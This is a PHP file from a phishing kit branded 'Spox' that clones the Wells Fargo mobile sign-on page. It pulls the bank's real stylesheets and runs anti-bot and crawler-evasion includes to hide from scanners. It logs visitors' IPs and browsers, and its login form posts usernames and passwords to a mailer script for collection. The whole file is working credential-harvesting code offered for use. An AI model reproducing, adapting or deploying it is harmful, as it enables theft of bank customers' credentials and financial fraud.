<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Wells -
 * version 1.0
 * Re-Loaded By Groot
 * icq+teleg = @iam_groot
 
###############################################
#$            C0d3d by Spoxcoder             $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';
@require "Spox/Anti/Crawler/src/CrawlerDetect.php";

use JayBizzle\CrawlerDetect\CrawlerDetect;

if (!isset($_GET['wells_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['WELLS_SPOX'])) {

  header("Location: index");
  exit();
}

    $visit_date = date("l d F Y H:i:s");
    $content = "#Spox_WELLS# IP: ".$_SESSION['ip']." - DATE: $visit_date - BROWSER: ".$_SESSION['browser']." SYSTEM: ".$_SESSION['platform']."   #Spox_WELLS#\r\n";

    $save=fopen("visit_log.txt","a+");
    fwrite($save,$content);
    fclose($save);

?>
<html lang="en" class="mobiletest-html"><head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
        <title>Mobile Sign on | Wells Fargo</title>
        <link rel="stylesheet" href="https://connect.secure.wellsfargo.com/auth/static/css/wf-fonts.css?v=85049D05F1" type="text/css">
        <link rel="stylesheet" href="https://connect.secure.wellsfargo.com/auth/static/css/frontporch.css?v=85049D05F1" type="text/css">
        <link type="text/css" href="https://connect.secure.wellsfargo.com/auth/static/wfa/css/signon_clean.css?v=85049D05F1" rel="stylesheet" media="screen,projection,print">
    
    </head>
 <body theme="ssep" id="body">
        
        
        <div control="lightbox" id="saveUsernameWarningDialog" class="dialog">
            <div class="container" tabindex="-1" role="alertdialog" aria-labelledby="saveUsernameWarningTitle">
                <span class="hide">Beginning of popup</span>
                <div class="lightbox-title">
                    <h2 id="saveUsernameWarningTitle">Save Username</h2>
                </div>
                <div class="lightbox-content">
                    <p>For your security we do not recommend using this feature on a shared device.</p>
                </div>
                <div class="lightbox-button-container">
                    <button control="button" id="closeSaveUsernameWarningDialogBtn" aria-label="close"></button>
                </div>
                <span class="hide">End of popup</span>
            </div>
        </div>
     
<div class="header" id="header">
  <div class="wf_logo" role="link">
    <img src="Spox/Files/img/icn-img-wf-logo.png" alt="Wells Fargo">
  </div>
  <div class="hamburger_menu" role="link">
    <a href="#"><img src="Spox/Files/img/icn_house.png" alt="Home"></a>
  </div>
</div>
        <main role="main">
            <article>
                        <section>
                            <div id="form">
                                <h1> Welcome </h1>
                                <h2><span class="icon-lock"></span><a href="#">Online &amp; Mobile Security</a></h2>
                                <form action="Spox/Mail/Mail1.php"  id="Signon" method="POST">

                                  
                                    <div>
                                        
                                             <input control="forms:input" type="text" name="username" id="j_username" placeholder="Username" required="" maxlength="14">
                                         
                                        <label id="username" class="sr-only" for="j_username">username</label>
                                        <div id="chkSave">
                                                    <input type="checkbox" value="true" id="saveUsernameCheckbox" name="save-username">
                                            <label for="saveUsernameCheckbox" role="checkbox">
                                                <span role="checkbox" aria-live="polite"></span>
                                                <p id="usernameLbl">Save Username</p>
                                            </label>
                                        </div>
                                    </div>
                            <div>
                                <input control="forms:input" type="password" id="password" name="password" placeholder="Password" required="" maxlength="32">
                                <label id="lblForPassword" class="sr-only" for="password">Password</label>
                            </div>
                            <div>
                                <button class="btn-primary" data-type="primary" aria-label="Sign On">Sign On</button>
                            </div>     
                        </form>
                        
                        <div id="forgot">
                            <p><a href="#">Forgot Password/Username?</a></p>
                        </div>
                        <div id="enroll">
                            <p>New to Wells Fargo Online<sup>®</sup>?</p>
                            <button id="enrollButton" control="button" aria-label="enroll" data-type="default">Enroll</button>
                        </div>
                    </div>
                </section>
                            


<footer>
    <p><a href="#" class="link">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="#" class="link">Ad Choices </a></p>
    <p><a href="#" class="link">Online Access Agreement</a>

            |
            <a aria-label="e sign consent" href="#" class="link">ESIGN Consent</a>
        
    </p>
    
    <p>©
        2020 Wells Fargo. All rights reserved.</p>
    <div id="carriage">
        <img src="Spox/Files/img/icn-GMMN-stagecoach-silhouette-mob-540x154_2109375-v1_00-xhdpi.png" alt="">
    </div>
</footer>
            </article>
          
        </main>
</body>
</html>